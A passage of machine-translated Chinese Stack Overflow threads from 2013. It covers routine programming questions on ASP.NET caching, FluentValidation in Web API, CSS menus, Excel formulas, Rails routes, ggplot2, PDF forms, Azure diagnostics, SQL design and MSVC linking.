        HttpContext.Current.Application["SOME_KEY"] = "ANY OBJECT";
        // .. etc
    } 
```

这样，您就可以从 ASP.NET 应用程序的任何位置读取您在全局 HttpApplicationState 实例中编写的内容，如下所示：

```
public partial class WebForm2 : System.Web.UI.Page {
    protected void Page_Load(object sender, EventArgs e) {

        object obj = this.Context.Application["SOME_KEY"];
        // ...etc...
    }
} 
```

关于重新运行您的应用程序：大多数时候，Web 服务器（尤其是 IIS，还有 ASP.NET 开发服务器）不会停止。每当您想要“重新运行”您的应用程序（如果它已停止）时，它就会启动。但是，当您停止调试时（单击 Visual Studio 中的停止按钮），这就是您所做的**一切。**您从 Web 服务器的进程中分离出来，让它安静地运行。

当您“重新运行”应用程序时，如果 Web 服务器已经在运行（有时 ASP.NET 开发服务器崩溃，IIS 也崩溃但不那么频繁），您只是“重新连接 IDE 的调试器”到 Web 服务器，你会发现一切都是一样的。

更重要的是：如果您重建（强制重建，以防不需要重建）Web 服务器不会停止，**但**它会丢弃您的应用程序（在隔离的 AppDomain 中运行）并重新加载新程序集并启动它再次。如果您记录 Global.asax "Application_Started" 方法，您可以看到所有这些内容。

**编辑**

这是一种安全的缓存方式（虽然经过优化以允许许多读者同时访问一些全局数据，但仍然会减慢速度——拥有缓存是一种奢侈，我能说什么:)）。

首先写一个这样的类：

```
public sealed class SafeCache<T> {

    private readonly ReaderWriterLockSlim rwLock = new ReaderWriterLockSlim(LockRecursionPolicy.SupportsRecursion);
    private readonly Func<T> expensiveReader;

    private readonly TimeSpan lease;
    private DateTime lastRead;
    private T data;

    public SafeCache(TimeSpan lease, Func<T> expensiveReader) {
        this.lease = lease;
        this.expensiveReader = expensiveReader;
        this.data = expensiveReader();
        this.lastRead = DateTime.UtcNow;
    }

    public T Data {
        get {
            this.rwLock.EnterReadLock();
            try {

                if (DateTime.UtcNow - this.lastRead < this.lease)
                    return this.data;

            } finally {
                this.rwLock.ExitReadLock();
            }

            this.rwLock.EnterUpgradeableReadLock();
            try {

                if (DateTime.UtcNow - this.lastRead < this.lease)
                    return this.data;
                else {
                    this.rwLock.EnterWriteLock();
                    try {

                        this.data = expensiveReader();
                        this.lastRead = DateTime.UtcNow;

                        return this.data;

                    } finally {
                        this.rwLock.ExitWriteLock();
                    }
                }

            } finally {
                this.rwLock.ExitUpgradeableReadLock();
            }
        }
    }

} 
```

然后使用 Global.asax 创建它的一个实例并将其放在 HttpApplicationState 全局实例中，在某个任意键处：

```
public class Global : System.Web.HttpApplication {

    protected void Application_Start(object sender, EventArgs e) {
        HttpContext.Current.Application["SOME_KEY"] = new SafeCache<SomeRecord[]> (
          lease: TimeSpan.FromMinutes(10),
          expensiveReader: () => {
             // .. read the database here
             // and return a SomeRecord[]
             // (this code will be executed for the first time by the ctor of SafeCache
             // and later on, with every invocation of the .Data property getter that discovers 
             // that 10 minutes have passed since the last refresh)
          }
        );
        // .. etc
    } 
```

您还可以创建一个小助手，例如：

```
public static class Helper {
    public static SomeRecord[] SomeRecords {
        get { 
           var currentContext = HttpContext.Current;
           if (null == currentContext) // return null or throw some clear Exception

           var cache = currentContext.Application["SOME_KEY"] as SafeCache<SomeRecord[]>;
           return cache.Data;
        }
    }
} 
```

当然，在需要的地方相应地使用它：

```
public partial class WebForm2 : System.Web.UI.Page {
    protected void Page_Load(object sender, EventArgs e) {

        SomeRecord[] records = Helper.SomeRecords;
        // ...etc...
    }
} 
```

**编辑结束**

# c# - Web API 中的依赖注入验证

> ID：15092809
> 
> 赞同：13
> 
> 时间：2013-02-26T15:23:07.530
> 
> 标签：c#, dependency-injection, asp.net-web-api, fluentvalidation

在 MVC 中，我可以创建一个可以接受依赖项的模型验证器。我通常为此使用 FluentValidation。例如，这使我可以检查未使用电子邮件地址的帐户注册（注意：这是一个简化的示例！）：

```
public class RegisterModelValidator : AbstractValidator<RegisterModel> {
    private readonly MyContext _context;
    public RegisterModelValidator(MyContext context) {
        _context = context;
    }
    public override ValidationResult Validate(ValidationContext<RegisterModel> context) {
        var result = base.Validate(context);
        if (context.Accounts.Any(acc => acc.Email == context.InstanceToValidate.Email)){
            result.Errors.Add(new ValidationFailure("Email", "Email has been used"));
        }
        return result;
    }
} 
```

对于带有 FluentValidation 的 Web API，不存在这样的集成。对此进行了几次[尝试](https://stackoverflow.com/a/13045097/163495)[，](https://fluentvalidation.codeplex.com/SourceControl/network/forks/paulduran/webapisupportv2/contribution/3940)但都没有解决依赖注入方面的问题，并且只使用静态验证器。

这很困难的原因是由于 MVC 和 Web API 之间的 ModelValidatorProvider 和 ModelValidator 的实现不同。在 MVC 中，这些是按请求实例化的（因此注入上下文很容易）。在 Web API 中，它们是静态的，并且 ModelValidatorProvider 为每种类型维护一个 ModelValidators 缓存，以避免对每个请求进行不必要的反射查找。

我一直在尝试自己添加必要的集成，但一直[在尝试获取 Dependency Scope](https://stackoverflow.com/q/15026349/163495)。相反，我想我会退后一步，询问是否有任何其他解决方案 - 是否有人提出了执行模型验证的解决方案，其中可以注入依赖项。

我不想在 Controller 中执行验证（我使用[ValidationActionFilter](https://stackoverflow.com/a/11724405/163495)来保持这个独立），这意味着我无法从控制器的构造函数注入中获得任何帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T07:43:33.700

我能够注册，然后使用[GetDependencyScope()](http://msdn.microsoft.com/en-us/library/system.net.http.httprequestmessageextensions.getdependencyscope%28v=vs.108%29.aspx)扩展方法从请求中访问 Web API 依赖解析器。这允许在执行验证过滤器时访问模型验证器。

如果这不能解决您的依赖注入问题，请随时澄清。

**Web API 配置（使用 Unity 作为 IoC 容器）：**

```
public static void Register(HttpConfiguration config)
{
    config.DependencyResolver   = new UnityDependencyResolver(
        new UnityContainer()
        .RegisterInstance<MyContext>(new MyContext())
        .RegisterType<AccountValidator>()

        .RegisterType<Controllers.AccountsController>()
    );

    config.Routes.MapHttpRoute(
        name:           "DefaultApi",
        routeTemplate:  "api/{controller}/{id}",
        defaults:       new { id = RouteParameter.Optional }
    );
} 
```

**验证操作过滤器：**

```
public class ModelValidationFilterAttribute : ActionFilterAttribute
{
    public ModelValidationFilterAttribute() : base()
    {
    }

    public override void OnActionExecuting(HttpActionContext actionContext)
    {
        var scope   = actionContext.Request.GetDependencyScope();

        if (scope != null)
        {
            var validator   = scope.GetService(typeof(AccountValidator)) as AccountValidator;

            // validate request using validator here...
        }

        base.OnActionExecuting(actionContext);
    }
} 
```

**模型验证器：**

```
public class AccountValidator : AbstractValidator<Account>
{
    private readonly MyContext _context;

    public AccountValidator(MyContext context) : base()
    {
        _context = context;
    }

    public override ValidationResult Validate(ValidationContext<Account> context)
    {
        var result      = base.Validate(context);
        var resource    = context.InstanceToValidate;

        if (_context.Accounts.Any(account => String.Equals(account.EmailAddress, resource.EmailAddress)))
        {
            result.Errors.Add(
                new ValidationFailure("EmailAddress", String.Format("An account with an email address of '{0}' already exists.", resource.EmailAddress))
            );
        }

        return result;
    }
} 
```

**API 控制器操作方法：**

```
[HttpPost(), ModelValidationFilter()]
public HttpResponseMessage Post(Account account)
{
    var scope = this.Request.GetDependencyScope();

    if(scope != null)
    {
        var accountContext = scope.GetService(typeof(MyContext)) as MyContext;
        accountContext.Accounts.Add(account);
    }

    return this.Request.CreateResponse(HttpStatusCode.Created);
} 
```

**型号（示例）：**

```
public class Account
{
    public Account()
    {
    }

    public string FirstName
    {
        get;
        set;
    }

    public string LastName
    {
        get;
        set;
    }

    public string EmailAddress
    {
        get;
        set;
    }
}

public class MyContext
{
    public MyContext()
    {
    }

    public List<Account> Accounts
    {
        get
        {
            return _accounts;
        }
    }
    private readonly List<Account> _accounts = new List<Account>();
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-05T22:32:14.363

我终于让这个工作了，但这有点麻烦。如前所述，ModelValidatorProvider 将保留所有 Validator 的 Singleton 实例，因此这是完全不合适的。相反，我使用过滤器来运行我自己的验证，正如 Oppositional 所建议的那样。这个过滤器可以访问`IDependencyScope`并且可以巧妙地实例化验证器。

在过滤器中，我通过`ActionArguments`，并通过验证。验证代码是从 的 Web API 运行时源中复制出来的`DefaultBodyModelValidator`，经过修改以在`DependencyScope`.

最后，要使用`ValidationActionFilter`，您需要[确保过滤器以特定顺序执行。](http://strathweb.com/2012/06/control-the-execution-order-of-your-filters-in-asp-net-web-api/)

[我已经在github](https://github.com/richardlawley/WebApi-FluentValidation)上打包了我的解决方案，并在 nuget 上提供了一个版本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-05-15T05:48:06.973

我让 DI 在 WebApi 中使用 Fluent Validators 没有问题。我发现验证器被调用了很多，而这些繁重的逻辑验证在模型验证器中没有位置。在我看来，模型验证器是用来检查数据形状的轻量级的。*看起来像电子邮件，并提供**来电*者*，**或者**？`Email``FirstName``LastName``Mobile``HomePhone`*

*像Can this email be registered 这样*的逻辑验证属于服务层，而不是控制器。我的实现也不共享隐式数据上下文，因为我认为这是一种反模式。

我认为当前的 NuGet 包具有 MVC3 依赖项，所以我最终只是[直接查看源代码](https://github.com/ninject/ninject.web.mvc.fluentvalidation/blob/master/src/Ninject.Web.Mvc.FluentValidation/NinjectValidatorFactory.cs)并创建自己的`NinjectFluentValidatorFactory`.

在`App_Start/NinjectWebCommon.cs`我们有以下内容。

```
 /// <summary>
    /// Set up Fluent Validation for WebApi.
    /// </summary>
    private static void FluentValidationSetup(IKernel kernel)
    {
        var ninjectValidatorFactory
                        = new NinjectFluentValidatorFactory(kernel);

        // Configure MVC
        FluentValidation.Mvc.FluentValidationModelValidatorProvider.Configure(
            provider => provider.ValidatorFactory = ninjectValidatorFactory);

        // Configure WebApi
        FluentValidation.WebApi.FluentValidationModelValidatorProvider.Configure(
            System.Web.Http.GlobalConfiguration.Configuration,
            provider => provider.ValidatorFactory = ninjectValidatorFactory);

        DataAnnotationsModelValidatorProvider.AddImplicitRequiredAttributeForValueTypes = false;
    } 
```

我相信上述唯一需要的其他软件包是：

```
 <package id="FluentValidation" version="5.1.0.0" targetFramework="net451" />
  <package id="FluentValidation.MVC5" version="5.1.0.0" targetFramework="net451" />
  <package id="FluentValidation.WebApi" version="5.1.0.0" targetFramework="net451" />
  <package id="Ninject" version="3.2.0.0" targetFramework="net451" />
  <package id="Ninject.MVC3" version="3.2.0.0" targetFramework="net451" />
  <package id="Ninject.Web.Common" version="3.2.0.0" targetFramework="net451" /> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-08-27T20:52:06.990

当然不建议这样做，因为该类是内部的，但您可以在 WebApi 配置中删除 IModelValidatorCache 服务。

```
public static class WebApiConfig
{
    public static void Register(HttpConfiguration config)
    {
        config.Services.Clear(Type.GetType("System.Web.Http.Validation.IModelValidatorCache, System.Web.Http"));
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-09-08T04:32:06.883

我花了很多时间试图找到解决 WebApi ModelValidatorProvider 将验证器存储为单例的好方法。我不想用验证过滤器标记事物，所以我最终在验证器中注入了 IKernel 并使用它来获取上下文。

```
public class RequestValidator : AbstractValidator<RequestViewModel>{
    public readonly IDbContext context;

    public RequestValidator(IKernel kernel) {
        this.context = kernel.Get<IDbContext>();

        RuleFor(r => r.Data).SetValidator(new DataMustHaveValidPartner(kernel)).When(r => r.RequestableKey == "join");
    }
} 
```

即使验证器存储为单例，这似乎也有效。如果您还希望能够使用上下文调用它，您可以只创建第二个构造函数，该构造函数使用`IDbContext`并使`IKernel`构造函数`IDbContext`通过`kernel.Get<IDbContext>()`

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2014-05-12T17:54:58.037

FluentValidation 对 WebApi 的支持已经有一段时间了（不确定您的问题是否在此之前日期）：[https ://fluentvalidation.codeplex.com/discussions/533373](https://fluentvalidation.codeplex.com/discussions/533373)

从线程引用：

```
{
   GlobalConfiguration.Configuration.Services.Add(typeof(System.Web.Http.Validation.ModelValidatorProvider),
       new WebApiFluentValidationModelValidatorProvider()
       {
           AddImplicitRequiredValidator = false //we need this otherwise it invalidates all not passed fields(through json). btw do it if you need
       });
       FluentValidation.ValidatorOptions.ResourceProviderType = typeof(FluentValidationMessages); // if you have any related resource file (resx)
       FluentValidation.ValidatorOptions.CascadeMode = FluentValidation.CascadeMode.Continue; //if you need! 
```

我一直在 WebApi2 项目中使用它，没有任何问题。

# html - 如何使用透明背景制作突出显示的下拉菜单

> ID：15092810
> 
> 赞同：0
> 
> 时间：2013-02-26T15:23:10.493
> 
> 标签：html, css, highlighting

我想用图像而不是这个烦人的箭头制作一个自定义下拉菜单所以在这个论坛上有人建议将选择包装在一个较小的 div 中。所以一切正常。问题在于选择。

当我选择一个选项时，您知道蓝色背景突出显示指示所选元素，问题是即使选择了元素，此突出显示仍然覆盖我的图像箭头。

我该如何解决这个问题

我尝试使用选择选项，但什么也没发生！

```
.styled-select select option ::selection {
       background:#fff;

} 
```

这是我的代码： **HTML**

```
 <div class="styled-select">
       <select>
          <option>Here is the first option</option>
          <option>The second option</option>
       </select>
        </div> 
```

**CSS：-**

```
 .styled-select select {
       background: transparent;
       width: 268px;
       padding: 5px;
        border: 0;
       border-radius: 0;
       height: 34px;
       line-height: 1;
       -webkit-appearance: none;
       }

    .styled-select {
       width: 240px;
       height: 34px;
       overflow: hidden;
       background: url(file:///C:/Users/gismo2/Pictures/fancy_nav_down.jpg) no-repeat right  ;
        border: 1px solid #ccc;
       } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T12:41:52.490

如果你想设置下拉菜单的样式，我建议使用类似的插件： [Jquery Selectbox](http://www.bulgaria-web-developers.com/projects/javascript/selectbox/)

您可以根据需要设置此下拉列表！

# excel - 使用通配符的查找列表

> ID：15092818
> 
> 赞同：0
> 
> 时间：2013-02-26T15:23:44.377
> 
> 标签：excel, excel-formula, formulas

我将从描述我的数据开始

```
List1:
Company           Result
---------
Company1 (1234)   1
Company1 (1445)   1
Company3blabla    2
Company4          0

LookupList:
Company     Index
------------------
*Company1*    1
*Company3*    2 
```

我正在尝试找到一个公式，如果 List1 中的每个 Company**包含**来自 LookupList 的匹配项（因此存在 * 通配符），它将搜索该公式，如果是这样，它将返回相应的索引值，如结果所示柱子。

到目前为止，我得到了一个公式，如果匹配则返回 1，否则返回 0，但我不知道如何从那里获取索引值：

{=MAX(ISNUMBER(SEARCH('LookupList'!$A$1:$A$2,List1[[#This Row],[Company]]))+0)}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:40:07.987

您不需要通配符（SEARCH 会自动在其他文本中搜索），因此您可以删除这些通配符并在结果列中使用此公式来获取 INDEX 值

`=IFERROR(LOOKUP(2^15,SEARCH('LookupList'!$A$1:$A$2,List1[[#This Row],[Company]]),'LookupList'!$B$1:$B$2),"")`

如果没有匹配，这会给你一个空白 - 如果需要，将末尾的“”更改为“不匹配”之类的文本

# ruby-on-rails - 路由文件有多灵活

> ID：15092819
> 
> 赞同：2
> 
> 时间：2013-02-26T15:23:50.080
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2

如果我所做的任何假设是错误的，请纠正我，但这是我的想法：

当我们在路由文件中使用一个新的“**资源**”时，假设有一个新的 GET REST API，最好也为该资源使用一个新的“**控制器”。**

现在，当我们使用**新控制器**时，我们还会根据该控制器的名称获得**一个新的默认路由。***这是我的问题开始的地方:)*

我已经有一个控制器和一个 GET REST，所以例如我有一个`health_mamagment`控制器，然后是一个类似的 URL`/health_managment/id.json`

所以现在当我在那个 URL 上时，它还有几个导航链接——比如 Windows 应用程序中的选项卡——所以用户可以点击其他链接并需要查看一些新数据。（仍然是相同的工作流程，他只是想看看一些新数据）。

所以在这里我调用一个新的 GET REST API 来获取一个链接的新数据，例如称为 Payers

那么像这样的 URL`/health_managment/id/payes` 有意义吗？

但是如果我们去为这个新的“payers”视图创建一个新的控制器和资源，那么我可以在路由文件中以某种方式使用“as”关键字吗？并将新路线映射为`/health_managment/id/payes`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:43:22.200

您可以在路由文件中嵌套资源并指定要使用的控制器：

```
 # /config/routes.rb
 resources :health_managment do
   resources :payes, :controller => "Payer" do
     member do
       # Your custom routes
     end
   end
 end 
```

这将导致您可以使用 url /health_managment/id/payes

作为对您的“付款人”控制器的访问。

使用 :as 不会修改 URI 端点，但会修改命名的帮助程序，如下所述：http: [//guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)在第 4 节。

根据评论中的要求，这里是对“成员”部分的更深入了解：

```
 # /config/routes.rb
 resources :posts do
   get 'recent'
   member do
       get 'abstract'
   end
 end 
```

将生成自定义网址：

*   GET /posts/recent 应该显示**一个**帖子列表。您正在将 url 链接到帖子集合
*   GET /posts/:id/abstract 应该以另一种方式显示**一个帖子（指定 ID）**

或者，您可以这样编写这条路线：

```
 # /config/routes.rb
 resources :posts do
   get 'recent', :on => :collection
   get 'abstract', :on => :member
 end 
```

当您声明子资源时，它们被设置在“成员级别”，因此：

```
 # /config/routes.rb
 resources :posts do
   get 'recent', :on => :collection
   get 'abstract', :on => :member
   resources :comments do
      # Routes again
   end
 end 
```

将允许您访问 URI /posts/:id/comments 并从那里定义自定义路由

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:32:33.307

是的，您提出的 URL 确实有意义，但您如何在路由文件中映射它取决于您的 health_management 资源和 payers 资源之间的关系。

如果两者之间存在 has_many/belongs_to 关系，我建议您查看[嵌套资源。](http://guides.rubyonrails.org/routing.html#nested-resources)您也可以使用以下路线手动执行此操作：

```
get '/health_managment/:id/payers' => 'payers#index' 
```

在您的付款人控制器文件中，您可以执行以下索引操作：

```
def index
  @health_managment = HealthManagment.find(params[:id])
  @payers = @health_managment.payers
end 
```

但是，如果您正在使用 API，则将其限制为通常的 REST 结构是有意义的，为此，嵌套资源可以很好地工作。

# r - 用 facet_grid 隐藏垂直轴

> ID：15092822
> 
> 赞同：1
> 
> 时间：2013-02-26T15:24:00.570
> 
> 标签：r, ggplot2

如果没有图表左侧的信息，我如何绘制它？即“wt”和它的数字不应该是可见的。图表必须保持完整。图表下方和右侧的信息应该是可见的。

```
library(ggplot2)
p <- ggplot(mtcars, aes(x=mpg, y=wt))
p <- p + geom_point()
p <- p + facet_grid(cyl ~ ., scales="free_y")
p 
```

通过阅读此处关于 SO 的其他问题和答案，我想可以使用 theme_blank()，但不确定将它与 facet_grids 放在哪里。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:26:35.173

这应该这样做。

```
p + scale_y_discrete(breaks=NULL) + ylab("") 
```

**编辑：**上面的解决方案改变了规模（忽略“免费”选项）。这个怎么样？

```
p + theme(axis.ticks.y = element_blank(), axis.text.y=element_blank(), 
            axis.title.y = element_blank()) 
```

# css - 水平两行 css 菜单问题

> ID：15092824
> 
> 赞同：3
> 
> 时间：2013-02-26T15:24:03.410
> 
> 标签：css, html-lists

我正在尝试使用带有 ul、li 元素的 CSS 创建一个水平菜单。目标是完成以下任务：每当菜单选项太长时，文本会转到第二行，垂直和水平对齐。

I managed to make that work, however when the option is two-lined, it automatically get the max-width parameter as its width, and doesn't set to option's actual width. 但是，当该选项是一行时，它确实设置为实际宽度。max-width 是我想要实现的错误参数吗？我*确实*希望 li 元素与其内容的宽度相同。

HTML：

```
<ul class="trials">
   <li><span><a href="#">kitchen furniture</a></span></li>
   <li><span><a href="#">wardrobes & cabinets</a></span></li>
   <li><span><a href="#">hallway furniture</a></span></li>
   <li><span><a href="#">materials</a></span></li>
</ul> 
```

CSS：

```
.trials {
     margin: 0;
     padding: 0;
     text-transform: uppercase;
     float: right;
}
.trials li {
     display: inline-block;
     list-style: none;
     margin-left: 10px;
}
.trials li {
     max-width: 130px; 
     line-height: 40px;
     height: 40px;
     border: 1px blue solid;        
}
.trials li span {
     display: -moz-inline-box; /* FF2 or lower */
     display: inline-block; /* FF3, Opera, Safari */
     line-height: normal;
     vertical-align: middle;
     text-align: center;
}
.trials li span { 
     *display  : inline; /* haslayout for IE6/7 */
} 
```

这是小提琴：http: [//jsfiddle.net/so_artistic/ecCM4/](http://jsfiddle.net/so_artistic/ecCM4/)

帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:44:23.517

伊迪哈拉，

这里有两个选项。

我的第一个解决方案是添加`width: 130px`和删除`max-width: 130px`. 这可确保文本环绕两行`li`项目，但也确保它们都是相同的大小。不幸的是，您不能通过设置 a 来强制文本换行为两行，`max-width`但也希望该文本能够调整框的大小。[- jsFiddle](http://jsfiddle.net/WW3P4/1/)

您也可以简单地`<br/>`在文本中添加一个以手动导致换行符。这将使您的按钮能够匹配其中文本的大小。[- jsFiddle](http://jsfiddle.net/8tPyf/1/)

确实，还有更多涉及 javascript 的选项，它可能会检测每个元素是否大于`130px`，然后使用 javascript 调整它的大小，同时将宽度设置为单词的宽度。这样的事情是可能的，但不一定是实用的。

我还`span`从您的代码中删除了所有内容。`span`和最初都是元素，这使得使用分组元素对每个个体都是多余`a`的。除非您的代码有更多标记/更复杂的事情，否则没有理由在标签之外添加。`inline``span``li``span``a`

我希望这有帮助。

# java - 如何使用 Javascript 或 Java 编辑可编辑的 pdf 表单

> ID：15092826
> 
> 赞同：3
> 
> 时间：2013-02-26T15:24:10.070
> 
> 标签：java, javascript, ajax, pdf, editing

我想开发一种软​​件或网站来帮助人们填写可编辑的 pdf 表格。用户只需要填写一些信息，我会收集信息并动态填写到可编辑的pdf表格中。我需要在这个项目中使用什么样的 Jar 或库？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:40:05.407

我在一些小型玩具项目中使用了[Apache PDFBox](http://pdfbox.apache.org/)，它非常易于使用并且运行良好（至少在文本提取方面）。我尝试使用[iTextPDF](http://itextpdf.com/)，但它不能很好地处理列。

关于表单，请查看 PDFBook 的[食谱](http://pdfbox.apache.org/userguide/cookbook.html)，其中有一个关于如何在 PDF 中设置表单字段值的示例。

# php - PHP ob_flush(); 在 IE10 中不起作用

> ID：15092837
> 
> 赞同：5
> 
> 时间：2013-02-26T15:24:42.430
> 
> 标签：php, flush, internet-explorer-10

我遇到了 PHP 问题`ob_flush();`

似乎它仅在 IE10 中不起作用。

gzip 和缓存在服务器上被禁用，它可以在除 IE10 之外的任何地方工作。

如果有人知道如何解决这个谜团，我将不胜感激！:)

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T21:43:54.237

如果您的输出小于 256 字节，这可能是问题所在。

从[flush() 文档](http://php.net/flush)中引用：

> 某些版本的 Microsoft Internet Explorer 仅在收到 256 字节的输出后才开始显示页面，因此您可能需要在刷新之前发送额外的空格以使这些浏览器显示页面。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:27:09.543

发送`header("Content-type: text/html;charset=utf-8;");`

# objective-c - Storyboard iOS 5.1 时横向方向不起作用

> ID：15092839
> 
> 赞同：2
> 
> 时间：2013-02-26T15:24:54.710
> 
> 标签：objective-c, ipad, uiinterfaceorientation

我有一个我正在使用 Storyboards 创建的应用程序，我只想支持横向模式，我已经完成了以下操作：

1.  在我的目标 > 摘要下，我只为支持的界面方向选择了横向左侧和横向右侧
2.  在我的故事板中，我已将所有 ViewControllers 设置为使用以下模拟指标 -**大小**：iPad 全屏 **方向**：横向

然而，在模拟器上，iPad 将处于横向，但视图将处于纵向，在 iPad 上相同，但仅适用于 iOS < 6 的设备

为什么会这样？我在这里想念什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T12:40:44.320

只需将此代码复制到您的应用程序委托中

```
-(BOOL)shouldAutorotate
{
    return YES;
}

-(NSUInteger)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window
{
    //just write yout desired orientations here
    return UIInterfaceOrientationMaskPortrait | UIInterfaceOrientationMaskPortraitUpsideDown ;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-18T10:02:18.670

在支持的界面方向 (iPad) 下的 info.plist 中...将横向移动到列表顶部。你的问题将得到解决。为我工作

# azure - 如何为 Azure 云诊断指定表存储名称

> ID：15092840
> 
> 赞同：2
> 
> 时间：2013-02-26T15:24:59.260
> 
> 标签：azure, azure-storage, azure-diagnostics

我创建了一个存储帐户作为 Azure 云诊断的目标。默认情况下，`WADLogstable`这是为我创建的。

我喜欢为每个角色更改表名。例如，对于`Webrole`我想拥有`WebroleWADLogstable`并`WebServiceRole`写入`WebServiceRoleWADLogs`表。

在诊断连接字符串中，我只能设置存储帐户名称。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:41:39.157

简单的回答：你不能那样做。`WADLogsTable`表包含一个名为的属性（列）`RoleName`，您可以通过查询该属性（连同`PartitionKey`）来过滤特定角色的数据。

# sql - SQL：在“一表多列”和“多表多次查询”之间

> ID：15092842
> 
> 赞同：1
> 
> 时间：2013-02-26T15:25:02.820
> 
> 标签：sql

我的网站有一个帖子系统，有3种类型的帖子

1.  图片
2.  视频
3.  转发

我使用 4 个表来管理这些数据

1.  邮政
2.  图片
3.  视频
4.  转发

发布到网站的每张图片、视频、转发都会有一个帖子行来保存点赞数、评论数等。

我必须查询评论被点赞或删除了多少次。

我想知道之间

1.  一表多列多空行一次查询
2.  多表，少空行，多次查询

哪个更好更快？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:31:59.023

与这些类型的问题一样，这个答案是“视情况而定”。

我建议您尝试创建一个数据视图，将您的 4 个表编译成一个单行、多列的结果集。您甚至可以索引此视图，如果需要，还可以索引该`INSERT INTO`视图。这应该可以让您很好地了解如何对数据进行建模。

在一个极端，你有：

*   多个表，需要多个索引（如果你想让所有东西都保持活力，就好像它是一行一样）将需要更多的存储空间。
*   但这也意味着您可以将数据表存储在不同的文件组和存储区域中，这样您的更大、更昂贵的二进制数据就不会占用您更昂贵的驱动器空间。

而在另一个极端，你有： * 一个不需要连接的表，并且那里有它需要的所有东西 * 但是有存储在一个文件文件组中并且随着你添加更多帖子类型而无法控制地增长的负担

在中间的某个地方，你有（索引的）视图。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:35:06.330

对此没有简单的答案。

如果将数据拆分到多个表中，则需要编写更复杂的 SQL，但数据库管理员可以将每个表放在不同的磁盘上，这样*加载*数据会更快。

搜索性能不受此影响，因为索引可以放在不同的磁盘上。

所以这取决于数据库架构、数据量、索引以及它们如何分配到磁盘以及数据库优化器是否会选择正确的策略。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-26T15:32:22.323

“哪一个更好更快？”

我不认为任何一个选项都更好*更快*- 一个表通常更快，多个表“更好”，因为它更容易维护并且不会导致重复数据。如果检索速度是您主要关心的问题，那么可以证明一张表是合理的，否则我会坚持规范化 [http://en.wikipedia.org/wiki/Database_normalization](http://en.wikipedia.org/wiki/Database_normalization)

即使有多个表，良好的索引也会对检索速度产生巨大影响，正如其他人所说，可能值得考虑使用视图/存储过程将数据放在一起

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-26T15:28:23.927

使用单个表，您可以消除 JOIN 的开销，因此它可能会更快。

但是，根据您的设置，您可能可以使用视图或存储过程将不同表中的数据拉到一起。这些将提高 JOIN 的效率，因为可以缓存/优化查询执行计划

# c++ - VS2010 C++ MFC多项目解决方案覆盖dll项目的自动链接

> ID：15092843
> 
> 赞同：0
> 
> 时间：2013-02-26T15:25:03.323
> 
> 标签：c++, visual-studio-2010, dll, mfc, linker

我有一个包含 17 个子项目的 MFC 解决方案。我最近刚刚添加了另一个 dll 项目，无法让可执行文件链接到库的重命名版本。在解决方案中 dll 项目的设置中，调试版本都在输出名称后附加了一个“D”以表示它是调试版本。在某些情况下，我们通过将 TargetName 更改为 $(ProjectName)D 来做到这一点，而在其他情况下，构建后事件会将其从构建目录复制到 lib 目录，并将其重命名为“D”。对于这个项目，当我编译 dll 时，我得到了预期的两个文件：MultiLangD.lib 和 MultiLangD.dll。这是 dll 项目的链接器命令行：

```
/OUT:".\Debug\MultiLangD.dll" /NOLOGO /DLL /MANIFEST 
/ManifestFile:".\Debug\MultiLangD.dll.intermediate.manifest" /ALLOWISOLATION 
/MANIFESTUAC:"level='asInvoker' uiAccess='false'" /DEBUG 
/PDB:"C:\WorkSpaces\WorkSpace_CFFT_II_i18n\CFFT_i18n_MBCS\CFFT\MultiLang\Debug\MultiLangD.pdb" 
/PGD:"C:\WorkSpaces\WorkSpace_CFFT_II_i18n\CFFT_i18n_MBCS\CFFT\MultiLang\Debug\MultiLangD.pgd" 
/TLBID:1 /DYNAMICBASE /NXCOMPAT /IMPLIB:".\Debug\MultiLangD.lib" /MACHINE:X86 
/ERRORREPORT:QUEUE 
```

这是 dll 项目的编译器命令行：

```
/ZI /nologo /W3 /WX- /Od /Oy- /D "WIN32" /D "_WINDOWS" /D "_DEBUG" /D "_AFXEXT" /D
"_MULTILANGDLL" /D "_CRT_SECURE_NO_WARNINGS" /D "_WINDLL" /D "_MBCS" /D "_AFXDLL" /Gm
/EHsc /RTC1 /MDd /GS /fp:precise /Zc:wchar_t /Zc:forScope /GR- /Yu"StdAfx.h" 
/Fp".\Debug\MultiLangD.pch" /Fa".\Debug\" /Fo".\Debug\" /Fd".\Debug\vc100.pdb" /Gd 
/analyze- /errorReport:queue 
```

在可执行项目中，我将 MultiLangD.lib 列为链接器的附加依赖项，将“Link Library Dependencies”设置为 no，将“Use Library Dependency Inputs”设置为 yes。MultiLang dll 项目未设置为可执行文件的项目依赖项。然而，在调试版本中，我收到一个错误，因为链接器找不到 MultiLang.lib。这是可执行项目的链接器命令行：

```
/OUT:".\Debug\WinGFApp.exe" /INCREMENTAL /NOLOGO /LIBPATH:"..\Lib"
